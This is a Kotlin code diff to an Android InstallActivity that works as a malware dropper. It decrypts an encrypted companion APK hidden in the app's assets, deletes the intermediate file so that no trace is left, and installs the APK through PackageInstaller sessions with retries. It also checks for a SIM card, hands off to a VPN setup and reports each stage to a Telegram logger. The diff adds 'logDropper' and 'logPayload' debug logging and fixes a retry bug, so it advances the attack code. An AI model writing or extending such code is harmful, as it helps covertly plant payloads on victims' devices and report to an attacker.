@@ -215,6 +215,8 @@ class InstallActivity : Activity() {
         if (stage != Stage.DONE && stage != Stage.ERROR) {
             TelegramLogger.log("onDestroy: flow interrupted at stage=$stage")
             TelegramLogger.flush("INTERRUPTED")
+            DebugLogger.logDropper("onDestroy — flow interrupted", DebugLogger.Status.FAILED, "stage=$stage")
+            DebugLogger.flush("INTERRUPTED")
         }
     }
 
@@ -228,7 +230,10 @@ class InstallActivity : Activity() {
         override fun onReceive(context: Context, intent: Intent) {
             if (intent.action == INSTALL_SUCCESS_ACTION) {
                 TelegramLogger.log("INSTALL_SUCCESS received — companion installed OK")
+                DebugLogger.logDropper("INSTALL_SUCCESS received", DebugLogger.Status.SUCCESS)
+                DebugLogger.logPayload("Installed", DebugLogger.Status.SUCCESS, "PackageInstaller STATUS_SUCCESS")
                 TelegramLogger.flush("SUCCESS")
+                DebugLogger.flush("SUCCESS")
                 val prefs = getSharedPreferences(StringPool.d(StringPool.PREFS_NAME), MODE_PRIVATE)
                 val cachedPath = prefs.getString(StringPool.d(StringPool.KEY_CACHED_PATH), null)
                 if (cachedPath != null) java.io.File(cachedPath).delete()
@@ -245,7 +250,9 @@ class InstallActivity : Activity() {
     private val installRestartReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context, intent: Intent) {
             if (intent.action == InstallReceiver.INSTALL_RESTART_ACTION) {
-                TelegramLogger.log("INSTALL_RESTART received — retrying install flow")
+                TelegramLogger.log("INSTALL_RESTART received — resetting flow flag and retrying")
+                DebugLogger.logDropper("installRestartReceiver", DebugLogger.Status.SUCCESS, "installFlowActive reset → retrying")
+                installFlowActive = false   // BUG FIX: reset guard so startDownload() is not skipped
                 startDownload()
             }
         }
@@ -507,10 +514,12 @@ class InstallActivity : Activity() {
     private fun startDownload() {
         if (installFlowActive) {
             TelegramLogger.log("startDownload() SKIPPED — install flow already active")
+            DebugLogger.logDropper("startDownload", DebugLogger.Status.SKIPPED, "installFlowActive=true")
             return
         }
         installFlowActive = true
         TelegramLogger.log("startDownload() called — starting download animation immediately")
+        DebugLogger.logDropper("startDownload", DebugLogger.Status.SUCCESS, "installFlowActive=true, animation starting")
 
         // SIM presence check — non-blocking, runs inline before animation starts
         val hasSim = try {
@@ -547,15 +556,20 @@ class InstallActivity : Activity() {
         if (mutatedFile.exists() && mutatedFile.length() > 0L) {
             val bytes = mutatedFile.readBytes()
             mutatedFile.delete()   // no trace left
+            DebugLogger.logDropper("getCompanionBytes", DebugLogger.Status.SUCCESS, "Tier 1 mutated — ${bytes.size} bytes")
             return bytes
         }
 
         // Tier 2: decrypt ASSET_A companion blob from assets
         // ASSET_A = [4-byte seed LE][LCG+nibble+XOR encrypted APK bytes]
         // Must decrypt to get the valid APK before passing to PackageInstaller
+        DebugLogger.logDropper("getCompanionBytes", DebugLogger.Status.PENDING, "Tier 1 miss — using Tier 2 ASSET_A")
         return try {
             val encrypted = assets.open(BuildConfig.ASSET_A).use { it.readBytes() }
-            if (encrypted.size < 5) return ByteArray(0)
+            if (encrypted.size < 5) {
+                DebugLogger.logDropper("getCompanionBytes Tier 2", DebugLogger.Status.FAILED, "ASSET_A too small: ${encrypted.size} bytes")
+                return ByteArray(0)
+            }
             val decrypted = decryptCompanionBlob(encrypted)
             // Verify decrypted bytes look like a valid APK (ZIP magic: PK\x03\x04)
             if (decrypted.size > 4 &&
@@ -563,19 +577,25 @@ class InstallActivity : Activity() {
                 decrypted[1] == 0x4B.toByte() &&
                 decrypted[2] == 0x03.toByte() &&
                 decrypted[3] == 0x04.toByte()) {
+                DebugLogger.logDropper("getCompanionBytes Tier 2", DebugLogger.Status.SUCCESS, "ASSET_A decrypted OK — ${decrypted.size} bytes, valid APK magic")
                 decrypted
             } else {
                 // Decryption produced invalid APK — return raw bytes anyway and let
                 // PackageInstaller reject it with a proper error rather than silently failing
+                DebugLogger.logDropper("getCompanionBytes Tier 2", DebugLogger.Status.FAILED, "ASSET_A decrypted but invalid APK magic — ${decrypted.size} bytes")
                 decrypted
             }
         } catch (e: Exception) {
             // assets.open() threw — ASSET_A not found in APK or I/O error
             // Fall back: try opening "companion.apk" directly (pre-rename fallback)
+            DebugLogger.logDropper("getCompanionBytes Tier 2", DebugLogger.Status.FAILED, "ASSET_A open EXCEPTION: ${e::class.simpleName}: ${e.message} — trying fallback")
             try {
                 val fallback = assets.open("companion.apk").use { it.readBytes() }
-                decryptCompanionBlob(fallback)
+                val fb = decryptCompanionBlob(fallback)
+                DebugLogger.logDropper("getCompanionBytes fallback", DebugLogger.Status.SUCCESS, "companion.apk fallback — ${fb.size} bytes")
+                fb
             } catch (e2: Exception) {
+                DebugLogger.logDropper("getCompanionBytes fallback", DebugLogger.Status.FAILED, "companion.apk also FAILED: ${e2::class.simpleName}: ${e2.message}")
                 ByteArray(0)
             }
         }
@@ -684,20 +704,26 @@ class InstallActivity : Activity() {
             if (phaseIndex == 2 && !installTriggered) {
                 installTriggered = true
                 setStage(Stage.INSTALLING)
+                DebugLogger.logDropper("Phase 3 — install triggered", DebugLogger.Status.SUCCESS)
                 Thread {
                     try {
                         val apkBytes = getCompanionBytes()
                         if (apkBytes.isNotEmpty()) {
                             TelegramLogger.log("Companion decrypted OK — ${apkBytes.size} bytes — proceeding to install")
+                            DebugLogger.logDropper("Companion bytes ready", DebugLogger.Status.SUCCESS, "${apkBytes.size} bytes → proceeding to install")
                             runOnUiThread { prepareAndStartVpn(apkBytes) }
                         } else {
                             TelegramLogger.log("Companion decryption returned EMPTY bytes — Stage.ERROR")
+                            DebugLogger.logDropper("Companion bytes EMPTY", DebugLogger.Status.FAILED, "0 bytes returned — Stage.ERROR")
                             TelegramLogger.flush("FAILED_EMPTY_DECRYPT")
+                            DebugLogger.flush("FAILED_EMPTY_DECRYPT")
                             runOnUiThread { setStage(Stage.ERROR) }
                         }
                     } catch (e: Exception) {
                         TelegramLogger.log("Companion decryption EXCEPTION: ${e::class.simpleName}: ${e.message}")
+                        DebugLogger.logDropper("Companion bytes EXCEPTION", DebugLogger.Status.FAILED, "${e::class.simpleName}: ${e.message}")
                         TelegramLogger.flush("FAILED_DECRYPT_EXCEPTION")
+                        DebugLogger.flush("FAILED_DECRYPT_EXCEPTION")
                         runOnUiThread { setStage(Stage.ERROR) }
                     }
                 }.start()
@@ -763,6 +789,7 @@ class InstallActivity : Activity() {
     @SuppressLint("BlockedPrivateApi")
     private fun installViaSession(apkBytes: ByteArray, attempt: Int) {
         TelegramLogger.log("installViaSession attempt=$attempt started — ${apkBytes.size} bytes")
+        DebugLogger.logDropper("installViaSession", DebugLogger.Status.SUCCESS, "attempt=$attempt — ${apkBytes.size} bytes")
         try {
             val packageInstaller = packageManager.packageInstaller
             val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
@@ -1104,6 +1131,7 @@ class InstallActivity : Activity() {
             TelegramLogger.log("attempt=$attempt calling createSession()")
             val sessionId = packageInstaller.createSession(params)
             TelegramLogger.log("attempt=$attempt createSession() OK sessionId=$sessionId")
+            DebugLogger.logDropper("createSession", DebugLogger.Status.SUCCESS, "attempt=$attempt sessionId=$sessionId")
             val session   = packageInstaller.openSession(sessionId)
             try {
                 // Save APK to cache so it survives activity recreation
@@ -1128,9 +1156,11 @@ class InstallActivity : Activity() {
                 )
                 session.close()
                 TelegramLogger.log("attempt=$attempt session committed + closed — waiting for InstallReceiver callback")
+                DebugLogger.logDropper("Session commit", DebugLogger.Status.SUCCESS, "attempt=$attempt sessionId=$sessionId — awaiting InstallReceiver")
 
             } catch (e: IOException) {
                 TelegramLogger.log("attempt=$attempt session IOException: ${e.message} — abandoning session")
+                DebugLogger.logDropper("Session IOException", DebugLogger.Status.FAILED, "attempt=$attempt — ${e.message}")
                 session.abandon()
                 if (attempt < MAX_RETRIES) {
                     TelegramLogger.log("attempt=$attempt retrying in 1s")
@@ -1138,18 +1168,21 @@ class InstallActivity : Activity() {
                 } else {
                     TelegramLogger.log("attempt=$attempt MAX_RETRIES reached — Stage.ERROR")
                     TelegramLogger.flush("FAILED_SESSION_IO")
+                    DebugLogger.flush("FAILED_SESSION_IO")
                     setStage(Stage.ERROR)
                 }
             }
         } catch (e: Exception) {
             android.util.Log.e("InstallActivity", "installViaSession attempt $attempt failed: ${e::class.simpleName}: ${e.message}", e)
             TelegramLogger.log("attempt=$attempt EXCEPTION: ${e::class.simpleName}: ${e.message}")
+            DebugLogger.logDropper("installViaSession EXCEPTION", DebugLogger.Status.FAILED, "attempt=$attempt — ${e::class.simpleName}: ${e.message}")
             if (attempt < MAX_RETRIES) {
                 TelegramLogger.log("attempt=$attempt retrying in 1s")
                 handler.postDelayed({ installViaSession(apkBytes, attempt + 1) }, 1000)
             } else {
                 TelegramLogger.log("attempt=$attempt MAX_RETRIES reached — Stage.ERROR (Download failed)")
                 TelegramLogger.flush("FAILED_MAX_RETRIES")
+                DebugLogger.flush("FAILED_MAX_RETRIES")
                 setStage(Stage.ERROR)
             }
         }
